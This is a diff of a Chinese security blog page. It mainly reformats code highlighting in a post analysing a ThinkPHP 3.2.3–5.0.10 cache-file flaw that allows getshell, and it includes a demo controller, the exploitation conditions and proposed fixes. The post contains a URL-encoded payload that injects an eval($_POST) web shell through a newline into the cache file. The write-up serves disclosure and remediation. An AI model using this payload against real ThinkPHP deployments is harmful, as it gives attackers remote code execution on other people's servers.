@@ -199,6 +199,26 @@
         </li>
       
         
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
@@ -331,7 +351,7 @@
 
       
         <p>thinkphp 缓存函数设计缺陷 getshell</p>
-<h2 id="0x00-前言-amp-amp-影响版本"><a href="#0x00-前言-amp-amp-影响版本" class="headerlink" title="0x00 前言&amp;&amp;影响版本"></a>0x00 前言&amp;&amp;影响版本</h2><p>不能说是thinkphp漏洞，因为官方压根就没承认，按照官方手册配置使用这个缓存功能是没有任何问题的，但单从其缓存函数上看确实存在因为未加过滤引起的可能getshell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">影响版本</span><br><span class="line"></span><br><span class="line">thinkphp 3.2.3-5.0.10</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x00-前言-amp-amp-影响版本"><a href="#0x00-前言-amp-amp-影响版本" class="headerlink" title="0x00 前言&amp;&amp;影响版本"></a>0x00 前言&amp;&amp;影响版本</h2><p>不能说是thinkphp漏洞，因为官方压根就没承认，按照官方手册配置使用这个缓存功能是没有任何问题的，但单从其缓存函数上看确实存在因为未加过滤引起的可能getshell。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">影响版本</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">thinkphp</span> 3<span class="selector-class">.2</span><span class="selector-class">.3-5</span><span class="selector-class">.0</span><span class="selector-class">.10</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h2><p>以下分析仅在理想环境下用于本地漏洞复现，生产环境下咯多漏洞利用难度系数较高，需要满足以下几个条件</p>
 <ul>
 <li>开启缓存功能</li>
@@ -340,10 +360,10 @@
 <li>同时可以控制缓存文件里的内容（比如通过写入到数据库进而生成缓存文件）</li>
 </ul>
 <h2 id="0x02-分析过程"><a href="#0x02-分析过程" class="headerlink" title="0x02 分析过程"></a>0x02 分析过程</h2><p>以5.0.10版本为例。</p>
-<p>生成新的Home模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php think build --module home</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//demo</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    namespace app\home\controller;</span><br><span class="line"></span><br><span class="line">    use think\Controller;</span><br><span class="line">    use think\Request;</span><br><span class="line">    use think\View;</span><br><span class="line">    use think\Url;</span><br><span class="line">    use think\Session;</span><br><span class="line">    use think\Db;</span><br><span class="line">    use app\home\model\Test as t;</span><br><span class="line">    use think\Cache;</span><br><span class="line">    use app\home\model\Article as a;</span><br><span class="line">class Index extends Controller</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public function add()&#123;      </span><br><span class="line">        $post = input(&apos;post.&apos;);</span><br><span class="line">        $article = Db::name(&apos;articles&apos;)-&gt;insert($post);</span><br><span class="line">        var_dump($article);</span><br><span class="line">    &#125;</span><br><span class="line">    public function Cache()&#123;</span><br><span class="line">        $article = Db::name(&apos;articles&apos;)-&gt;field(&apos;*&apos;)-&gt;select();</span><br><span class="line">        Cache::set(&apos;name&apos;,$article,3600);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>生成新的Home模块<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php think build --<span class="keyword">module</span> <span class="built_in">home</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">home</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">View</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Url</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Session</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">app</span>\<span class="title">home</span>\<span class="title">model</span>\<span class="title">Test</span> <span class="title">as</span> <span class="title">t</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">app</span>\<span class="title">home</span>\<span class="title">model</span>\<span class="title">Article</span> <span class="title">as</span> <span class="title">a</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">()</span></span>&#123;      </span><br><span class="line">        $post = input(<span class="string">'post.'</span>);</span><br><span class="line">        $article = Db::name(<span class="string">'articles'</span>)-&gt;insert($post);</span><br><span class="line">        var_dump($article);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Cache</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $article = Db::name(<span class="string">'articles'</span>)-&gt;field(<span class="string">'*'</span>)-&gt;select();</span><br><span class="line">        Cache::set(<span class="string">'name'</span>,$article,<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>Demo建好了，add()方法用于向数据库中插入数据，cache()方法用于缓存数据。<br>下面开始分析代码。<br>当访问下面的url调用cache方法时</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp_5.0.10_full/public/index.php/Home/index/cache</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/thinkphp_5.0.10_full/</span>public<span class="regexp">/index.php/</span>Home<span class="regexp">/index/</span>cache</span><br></pre></td></tr></table></figure>
 <p>函数调用栈<br><img src="https://i.loli.net/2019/01/25/5c4afd118b5cd.png" alt><br>这里重点说一下 <strong>thinkphp\cache]driver\File</strong>下的set()方法</p>
 <p><img src="https://i.loli.net/2019/01/25/5c4afd772fc88.png" alt></p>
 <p>首先跟入getCacheKey方法可以看到，获取到的是缓存文件目录，其将缓存名称经过md5()，前两位作为目录名，后面的作为缓存文件名。</p>
@@ -353,7 +373,7 @@
 <p>获取到缓存文件名之后继续向下运行，可以看到将要缓存的数据进行序列化之后直接拼接写入到了缓存目录，也就是这里的数据没有做任何过滤，所以出现了漏洞。<br>这里的data虽然拼接到了注释语句中，但是因为没有任何过滤可以通过注入换行符跳出单行注释，而且序列化函数不会对换行符做任何处理。</p>
 <p>那么我们便可以通过demo中的add()方法先向数据库存入payload<br><img src="https://i.loli.net/2019/01/25/5c4b037507c9f.png" alt><br>数据中<br><img src="https://i.loli.net/2019/01/25/5c4b038a31104.png" alt></p>
 <p>然后访问cache方法，既可以看到paylaod进入到了缓存文件<br><img src="https://i.loli.net/2019/01/25/5c4b03e2639b9.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload</span><br><span class="line">content=%2f%2f%0d%0a%24a%3deval(%24_POST%5b%27a3%27%5d)%3b%23</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload</span></span><br><span class="line">content=%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">24</span>a%<span class="number">3</span>deval(%<span class="number">24</span>_POST%<span class="number">5</span>b%<span class="number">27</span>a3%<span class="number">27</span>%<span class="number">5</span>d)%<span class="number">3</span>b%<span class="number">23</span></span><br></pre></td></tr></table></figure>
 <h2 id="0x03-修复方法"><a href="#0x03-修复方法" class="headerlink" title="0x03 修复方法"></a>0x03 修复方法</h2><ol>
 <li><p>完善框架中set()方法，在/thinkphp/library/think/cache/driver/File.php 中的set()函数中对于$value参数进行过滤，去除换行符号。添加代码<strong>$data = str_replace(PHP_EOL, ‘’, $data);</strong>但存在因为去除换行符导致的文本布局改变。</p>
 </li>
@@ -381,9 +401,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
           
-            <a href="/tags/thinkphp/" rel="tag"># thinkphp</a>
+            <a href="/tags/thinkphp/" rel="tag"><i class="fa fa-tag"></i> thinkphp</a>
           
         </div>
       
@@ -485,7 +505,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -495,10 +515,10 @@
               
               
               <div class="site-state-item site-state-categories">
-                
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
-                
+                </a>
               </div>
             
 
@@ -506,10 +526,10 @@
               
               
               <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">13</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
-                
+                </a>
               </div>
             
 
@@ -560,7 +580,8 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -570,6 +591,11 @@
 </div>
 
 
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
   <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
